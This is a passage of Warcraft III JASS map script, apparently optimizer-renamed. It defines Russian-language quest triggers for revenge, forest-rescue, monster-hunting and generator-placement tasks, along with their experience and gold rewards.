function BCY takes nothing returns nothing
set Yb=CreateTrigger()
call DisableTrigger(Yb)
call TriggerRegisterAnyUnitEventBJ(Yb,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yb,Condition(function BCN))
call TriggerAddAction(Yb,function BCX)
endfunction
function BCZ takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$686B6E69) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BCa takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=5) then
return false
endif
return true
endfunction
function BCb takes nothing returns nothing
if BCa() then
call DestroyEffectBJ(Us[1])
call AddSpecialEffectTargetUnitBJ("overhead",KJ,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[1]=GetLastCreatedEffectBJ()
call EnableTrigger(Yd)
call ShowUnitShow(Lf)
call PauseUnitBJ(false,Lf)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Месть\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 5-10|r")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Месть","|c006969FFУровень задания: 5-10|r
У многих ведь есть братья, сестры, да? И не все их любят. Я прав? так вот, я своего брата НЕНАВИЖУ! Спросите почему? Он убил мою невесту из-за своих личных побуждений!!! ","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[1]=GetLastCreatedQuestBJ()
call DisableTrigger(GetTriggeringTrigger())
else
call ne(GetTriggerUnit(),"Задание с |c00ff00005|r уровня",.027,255,255,255)
endif
endfunction
function BCc takes nothing returns nothing
set Yc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Yc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yc,Condition(function BCZ))
call TriggerAddAction(Yc,function BCb)
endfunction
function BCd takes nothing returns boolean
if not (GetDyingUnit()==Lf) then
return false
endif
return true
endfunction
function BCe takes nothing returns nothing
call DestroyEffectBJ(Us[1])
call EnableTrigger(Ye)
set YV[16]=GetUnitLoc(GetTriggerUnit())
call AddSpecialEffectTargetUnitBJ("overhead",KJ,"war3mapImported\\QuestYellow1.mdx")
set Us[1]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Брат убит! Вернитесь к Всаднику за наградой|r")
call DisableTrigger(GetTriggeringTrigger())
call RemoveLocation(YV[16])
endfunction
function BCf takes nothing returns nothing
set Yd=CreateTrigger()
call DisableTrigger(Yd)
call TriggerRegisterAnyUnitEventBJ(Yd,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Yd,Condition(function BCd))
call TriggerAddAction(Yd,function BCe)
endfunction
function BCg takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$686B6E69) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BCh takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BCi takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BCj takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BCk takes nothing returns boolean
return GetBooleanAnd(BCi(),BCj())
endfunction
function BCl takes nothing returns boolean
return GetBooleanAnd(BCh(),BCk())
endfunction
function BCm takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=5) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=10) then
return false
endif
return true
endfunction
function BCn takes nothing returns nothing
if BCm() then
call AddHeroXP(GetEnumUnit(),1000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1000
else
endif
endfunction
function BCo takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=5) then
return false
endif
return true
endfunction
function BCp takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=5) then
return false
endif
return true
endfunction
function BCq takes nothing returns nothing
if BCp() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[1])
call QuestSetCompletedBJ(YX[1],true)
call DestroyQuest(YX[1])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BCl))
call ForGroupBJ(Th,function BCn)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1000 опыта|r, |c00ffff00100 золота|r, |c00ff96964 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BCo() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+300
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+12
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
call TriggerSleepAction(5.)
call AddSpecialEffectTargetUnitBJ("origin",KJ,"war3mapImported\\TalkToMev2.mdx")
set Us[1]=GetLastCreatedEffectBJ()
call EnableTrigger(Yf)
else
call ne(GetTriggerUnit(),"Задание с |c00ff00005|r уровня",.027,255,255,255)
endif
endfunction
function BCr takes nothing returns nothing
set Ye=CreateTrigger()
call DisableTrigger(Ye)
call TriggerRegisterAnyUnitEventBJ(Ye,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Ye,Condition(function BCg))
call TriggerAddAction(Ye,function BCq)
endfunction
function BCs takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$686B6E69) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BCt takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=6) then
return false
endif
return true
endfunction
function BCu takes nothing returns nothing
if BCt() then
call EnableTrigger(Yg)
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[1])
call AddSpecialEffectTargetUnitBJ("overhead",KJ,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[1]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Месть. Часть вторая\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 6-13|r")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Месть. Часть вторая","Ну раз уж такая пьянка пошла, все всех убивают. кровь льется... Эх! Где мои молодые годы, побегал бы с вами. Но... Ладно, убьете огромное Дерево? Бесит меня, когда рядом п","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[1]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff00006|r уровня",.027,255,255,255)
endif
endfunction
function BCv takes nothing returns nothing
set Yf=CreateTrigger()
call DisableTrigger(Yf)
call TriggerRegisterAnyUnitEventBJ(Yf,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yf,Condition(function BCs))
call TriggerAddAction(Yf,function BCu)
endfunction
function BCw takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303048) then
return false
endif
return true
endfunction
function BCx takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Yh)
call DestroyEffectBJ(Us[1])
call AddSpecialEffectTargetUnitBJ("overhead",KJ,"war3mapImported\\QuestYellow1.mdx")
set Us[1]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Дерево убито! Вернитесь к Всаднику за наградой|r")
endfunction
function BCy takes nothing returns nothing
set Yg=CreateTrigger()
call DisableTrigger(Yg)
call TriggerRegisterAnyUnitEventBJ(Yg,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Yg,Condition(function BCw))
call TriggerAddAction(Yg,function BCx)
endfunction
function BCz takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$686B6E69) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BC0 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BC1 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BC2 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BC3 takes nothing returns boolean
return GetBooleanAnd(BC1(),BC2())
endfunction
function BC4 takes nothing returns boolean
return GetBooleanAnd(BC0(),BC3())
endfunction
function BC5 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=6) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=13) then
return false
endif
return true
endfunction
function BC6 takes nothing returns nothing
if BC5() then
call AddHeroXP(GetEnumUnit(),1500,false)
else
endif
endfunction
function BC7 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=6) then
return false
endif
return true
endfunction
function BC8 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=6) then
return false
endif
return true
endfunction
function BC9 takes nothing returns nothing
if BC8() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[1])
call QuestSetCompletedBJ(YX[1],true)
call DestroyQuest(YX[1])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BC4))
call ForGroupBJ(Th,function BC6)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1500 опыта|r, |c00ffff00150 золота|r, |c00ff96964 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BC7() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+450
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+12
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff00006|r уровня",.027,255,255,255)
endif
endfunction
function BDB takes nothing returns nothing
set Yh=CreateTrigger()
call DisableTrigger(Yh)
call TriggerRegisterAnyUnitEventBJ(Yh,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yh,Condition(function BCz))
call TriggerAddAction(Yh,function BC9)
endfunction
function BDC takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E766C77) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BDD takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=2) then
return false
endif
return true
endfunction
function BDE takes nothing returns nothing
if BDD() then
call DestroyEffectBJ(Us[2])
call AddSpecialEffectTargetUnitBJ("overhead",KQ,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[2]=GetLastCreatedEffectBJ()
call EnableTrigger(Yj)
call EnableTrigger(Yk)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"В Лесу\"")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 2-5|r")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"В Лесу","Мои дети. . . Мои любимые деточки! Вчера они пошли в лес но так и не вернулись. Я в отчаянии прошу помощи героев
|c00FF0000Уровень задания: 2-5|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[2]=GetLastCreatedQuestBJ()
call DisableTrigger(GetTriggeringTrigger())
else
call ne(GetTriggerUnit(),"Задание с |c00ff00002|r уровня",.027,255,255,255)
endif
endfunction
function BDF takes nothing returns nothing
set Yi=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Yi,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yi,Condition(function BDC))
call TriggerAddAction(Yi,function BDE)
endfunction
function BDG takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303044))==true) then
return false
endif
return true
endfunction
function BDH takes nothing returns nothing
call DestroyEffectBJ(Us[2])
call EnableTrigger(Yl)
call DisableTrigger(Yj)
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Дети найдены и спасены! Вернитесь за наградой!|r")
call AddSpecialEffectTargetUnitBJ("overhead",KQ,"war3mapImported\\QuestYellow1.mdx")
set Us[2]=GetLastCreatedEffectBJ()
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303044))
set YV[17]=GetUnitLoc(KP)
call SetUnitPositionLoc(Ie,YV[17])
call SetUnitPositionLoc(IY,YV[17])
call RemoveLocation(YV[17])
endfunction
function BDI takes nothing returns nothing
set Yk=CreateTrigger()
call DisableTrigger(Yk)
call TriggerRegisterEnterRectSimple(Yk,N)
call TriggerAddCondition(Yk,Condition(function BDG))
call TriggerAddAction(Yk,function BDH)
endfunction
function BDJ takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BDK takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_ALWAYSHINT,"|cffffcc00Помогите нам вернуться домой!|r")
endfunction
function BDL takes nothing returns nothing
set Yj=CreateTrigger()
call DisableTrigger(Yj)
call TriggerRegisterEnterRectSimple(Yj,N)
call TriggerAddCondition(Yj,Condition(function BDJ))
call TriggerAddAction(Yj,function BDK)
endfunction
function BDM takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E766C77) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BDN takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BDO takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BDP takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BDQ takes nothing returns boolean
return GetBooleanAnd(BDO(),BDP())
endfunction
function BDR takes nothing returns boolean
return GetBooleanAnd(BDN(),BDQ())
endfunction
function BDS takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=2) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=5) then
return false
endif
return true
endfunction
function BDT takes nothing returns nothing
if BDS() then
call AddHeroXP(GetEnumUnit(),400,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+400
else
endif
endfunction
function BDU takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=2) then
return false
endif
return true
endfunction
function BDV takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=2) then
return false
endif
return true
endfunction
function BDW takes nothing returns nothing
if BDV() then
call DisableTrigger(GetTriggeringTrigger())
call QuestSetCompletedBJ(YX[2],true)
call DestroyQuest(YX[2])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BDR))
call ForGroupBJ(Th,function BDT)
call DestroyGroup(Th)
set Sf=Sf+1
call DestroyEffectBJ(Us[2])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF400 опыта|r, |c00ffff0070 золота|r, |c00ff96962 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BDU() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+210
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+6
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff00002|r уровня",.027,255,255,255)
endif
endfunction
function BDX takes nothing returns nothing
set Yl=CreateTrigger()
call DisableTrigger(Yl)
call TriggerRegisterAnyUnitEventBJ(Yl,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yl,Condition(function BDM))
call TriggerAddAction(Yl,function BDW)
endfunction
function BDY takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4F726578) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BDZ takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=9) then
return false
endif
return true
endfunction
function BDa takes nothing returns nothing
if BDZ() then
call DestroyEffectBJ(Us[3])
call AddSpecialEffectTargetUnitBJ("overhead",KR,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[3]=GetLastCreatedEffectBJ()
call EnableTrigger(Yn)
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(KS,Player(11),true)
call SetUnitOwner(KT,Player(11),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Почти сдох\"")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 9-14|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Почти сдох","|c006969FFУровень задания: 9-14|r
Здраствуйте, салаги! На будущее - вы все уже трупы! Но за время своей жалкой жизни можете оказать мне ещё одну услугу: убейте Мертвое Отродье, которое поселилось недалеко в Лесу. Его пещера находится между трёх огней, проход к которой откроет ключ, что сьели мои медведи.","ReplaceableTextures\\CommandButtons\\BTNGhoul.blp")
set YX[3]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff00009|r уровня",.027,255,255,255)
endif
endfunction
function BDb takes nothing returns nothing
set Ym=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Ym,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Ym,Condition(function BDY))
call TriggerAddAction(Ym,function BDa)
endfunction
function BDc takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303047))==true) then
return false
endif
return true
endfunction
function BDd takes nothing returns nothing
call EnableTrigger(Yo)
call EnableTrigger(Vf)
call DisableTrigger(GetTriggeringTrigger())
set YV[19]=GetRectCenter(Q)
call SetUnitPositionLoc(GetEnteringUnit(),YV[19])
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303047))
call RemoveLocation(YV[19])
endfunction
function BDe takes nothing returns nothing
set Yn=CreateTrigger()
call DisableTrigger(Yn)
call TriggerRegisterEnterRectSimple(Yn,O)
call TriggerAddCondition(Yn,Condition(function BDc))
call TriggerAddAction(Yn,function BDd)
endfunction
function BDf takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BDg takes nothing returns nothing
set YV[20]=GetRectCenter(R)
call SetUnitPositionLoc(GetEnteringUnit(),YV[20])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[20],0)
call RemoveLocation(YV[20])
endfunction
function BDh takes nothing returns nothing
set Vf=CreateTrigger()
call DisableTrigger(Vf)
call TriggerRegisterEnterRectSimple(Vf,O)
call TriggerAddCondition(Vf,Condition(function BDf))
call TriggerAddAction(Vf,function BDg)
endfunction
function BDi takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BDj takes nothing returns nothing
set YV[21]=GetRectCenter(P)
call SetUnitPositionLoc(GetEnteringUnit(),YV[21])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[21],0)
call RemoveLocation(YV[21])
endfunction
function BDk takes nothing returns nothing
set Yo=CreateTrigger()
call DisableTrigger(Yo)
call TriggerRegisterEnterRectSimple(Yo,Q)
call TriggerAddCondition(Yo,Condition(function BDi))
call TriggerAddAction(Yo,function BDj)
endfunction
function BDl takes nothing returns nothing
call DestroyEffectBJ(Us[3])
call EnableTrigger(Ve)
call AddSpecialEffectTargetUnitBJ("overhead",KR,"war3mapImported\\QuestYellow1.mdx")
set Us[3]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Отродье осталось гнить в своем логове. Возвращайтесь за наградой|r")
call DisableTrigger(Vf)
endfunction
function BDm takes nothing returns nothing
set Yp=CreateTrigger()
call TriggerRegisterUnitEvent(Yp,K2,EVENT_UNIT_DEATH)
call TriggerAddAction(Yp,function BDl)
endfunction
function BDn takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4F726578) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BDo takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BDp takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BDq takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BDr takes nothing returns boolean
return GetBooleanAnd(BDp(),BDq())
endfunction
function BDs takes nothing returns boolean
return GetBooleanAnd(BDo(),BDr())
endfunction
function BDt takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=9) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=14) then
return false
endif
return true
endfunction
function BDu takes nothing returns nothing
if BDt() then
call AddHeroXP(GetEnumUnit(),1800,false)
else
endif
endfunction
function BDv takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=9) then
return false
endif
return true
endfunction
function BDw takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=9) then
return false
endif
return true
endfunction
function BDx takes nothing returns nothing
if BDw() then
call DestroyEffectBJ(Us[3])
call QuestSetCompletedBJ(YX[3],true)
call DestroyQuest(YX[3])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BDs))
call ForGroupBJ(Th,function BDu)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1800 опыта|r, |c00ffff00150 золота|r, |c00ff96964 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BDv() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+450
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+12
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff00009|r уровня",.027,255,255,255)
endif
endfunction
function BDy takes nothing returns nothing
set Ve=CreateTrigger()
call DisableTrigger(Ve)
call TriggerRegisterAnyUnitEventBJ(Ve,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Ve,Condition(function BDn))
call TriggerAddAction(Ve,function BDx)
endfunction
function BDz takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$48616D67) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BD0 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Полный контроль\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 1-5|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Полный контроль","Видели Лес? Он кишит всякими тварями, которые так и жаждут выпустить тебе кишки через рот! И вот для того, чтобы я мог четко контролировать все действия в Лесу, нужно расположить |c0000FF005 генераторов по 5 точкам|r! Каждая точка будет помечена |c0000FF00зеленой руной|r. Вперед, за работу!!!
|c006969FFУровень задания: 1-5|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[4]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[4])
call AddSpecialEffectTargetUnitBJ("overhead",KU,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[4]=GetLastCreatedEffectBJ()
set YV[22]=GetUnitLoc(GetTriggerUnit())
call CreateItemLoc($4930304A,YV[22])
call RemoveLocation(YV[22])
endfunction
function BD1 takes nothing returns nothing
set Yq=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Yq,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yq,Condition(function BDz))
call TriggerAddAction(Yq,function BD0)
endfunction
function BD2 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930304A) then
return false
endif
return true
endfunction
function BD3 takes nothing returns boolean
if not (RectContainsUnit(V,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BD4 takes nothing returns boolean
if not (RectContainsUnit(X,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BD5 takes nothing returns boolean
if not (RectContainsUnit(W,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BD6 takes nothing returns boolean
if not (RectContainsUnit(U,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BD7 takes nothing returns boolean
if not (RectContainsUnit(T,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BD8 takes nothing returns boolean
if not (RZ[999]>=5) then
return false
endif
return true
endfunction
function BD9 takes nothing returns nothing
if BD3() then
call CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$68303152,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()),270.)
call RemoveRect(V)
set RZ[999]=RZ[999]+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Генераторов установлено|r: "+(I2S(RZ[999])+"/|c0000ff005"))
else
endif
if BD4() then
call CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$68303152,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()),270.)
call RemoveRect(X)
set RZ[999]=RZ[999]+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Генераторов установлено|r: "+(I2S(RZ[999])+"/|c0000ff005"))
else
endif
if BD5() then
call CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$68303152,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()),270.)
call RemoveRect(W)
set RZ[999]=RZ[999]+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Генераторов установлено|r: "+(I2S(RZ[999])+"/|c0000ff005"))
else
endif
if BD6() then
call CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$68303152,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()),270.)
call RemoveRect(U)
set RZ[999]=RZ[999]+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Генераторов установлено|r: "+(I2S(RZ[999])+"/|c0000ff005"))
else
endif
if BD7() then
call CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$68303152,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()),270.)
call RemoveRect(T)
set RZ[999]=RZ[999]+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Генераторов установлено|r: "+(I2S(RZ[999])+"/|c0000ff005"))
else
endif
if BD8() then
call DestroyEffectBJ(Us[4])
call AddSpecialEffectTargetUnitBJ("overhead",KU,"war3mapImported\\QuestYellow1.mdx")
set Us[4]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ff00ffВсе генераторы на месте. Вернитесь за наградой")
call EnableTrigger(Ys)
call RemoveItem(nP(GetTriggerUnit(),$4930304A))
else
endif
endfunction
function BEB takes nothing returns nothing
set Yr=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Yr,EVENT_PLAYER_UNIT_USE_ITEM)
